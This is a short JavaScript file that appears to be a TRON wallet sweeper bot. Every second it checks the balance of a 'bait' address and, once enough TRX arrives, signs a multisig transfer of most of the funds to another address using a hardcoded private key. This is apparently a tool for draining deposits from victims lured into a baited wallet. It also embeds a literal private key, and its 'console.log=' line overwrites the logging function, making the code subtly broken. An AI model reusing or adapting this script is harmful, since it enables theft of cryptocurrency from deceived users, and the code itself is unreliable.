const TronWeb = require('tronweb')

const bait_address = 'TRX9wSUB26DnEsqcKsdtWJFoonZfAw15yv'
const real_private_key = '43628750ae86ccbf181f112abf27d7871a56a63f7060240ed2b33f10d0181e34'
const send_to = 'TPeNHNuVK78GvNbqDg2bb9wkJxd5DCLL9N'

async function main(){
    try{
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
        })

        let check_it = setInterval(async function () {
            try{
                let balance = await tronWeb.trx.getBalance(bait_address)
                console.log= (`Current balance ${balance}`)
                let sac = true
                if (balance/500000 >= 5){
                    const withdraw_amount = balance - 2000000
                    console.log(`Withdrawing ${withdraw_amount} TRX`)

                    const first_tx = await tronWeb.transactionBuilder.sendTrx(send_to, withdraw_amount, bait_address);
                    let signed_tx = await tronWeb.trx.multiSign(first_tx, real_private_key, 0)
                    let asd = await tronWeb.trx.sendRawTransaction(signed_tx)
                    console.log(asd)
                }
            }catch (err){
                console.log(err.message)
            }
        }, 1000);
    }catch (err){
        console.log(err)
    }
}

main()
